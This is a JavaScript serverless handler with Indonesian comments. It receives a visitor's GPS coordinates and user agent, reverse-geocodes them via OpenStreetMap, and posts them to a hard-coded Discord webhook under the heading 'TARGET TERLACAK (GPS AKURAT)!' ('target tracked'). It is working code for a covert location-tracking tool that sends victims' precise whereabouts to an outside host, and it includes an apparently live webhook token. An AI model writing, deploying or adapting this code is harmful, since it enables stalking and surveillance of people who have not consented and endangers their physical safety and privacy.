export default async function handler(req, res) {
    // Izinkan akses dari mana saja (CORS)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            // Ambil data lat dan lon dari request body secara aman
            const { lat, lon } = req.body || {};
            const userAgent = req.headers['user-agent'] || 'Unknown';

            if (!lat || !lon) {
                return res.status(400).json({ error: 'Koordinat tidak lengkap' });
            }

            // Ambil alamat dari OpenStreetMap
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            const geoData = await geoRes.json();
            const address = geoData.display_name || 'Tidak diketahui';

            // Webhook Discord Anda
            const discordWebhookUrl = "https://discord.com/api/webhooks/1563200957985202330/D_-tm21Rstj0Z3jXL7YAFjyIvSqBfdT9DT0uesV9-90YZ0ZCx8Psg6x_qVf0WbV0ls4R";

            if (discordWebhookUrl) {
                const message = {
                    content: `🎯 **TARGET TERLACAK (GPS AKURAT)!** 🎯\n` +
                             `📍 **Alamat:** ${address}\n` +
                             `🌐 **Koordinat:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
                             `💻 **Perangkat:** ${userAgent}`
                };

                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            }

            return res.status(200).json({ success: true });
        } catch (error) {
            console.error("Error:", error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}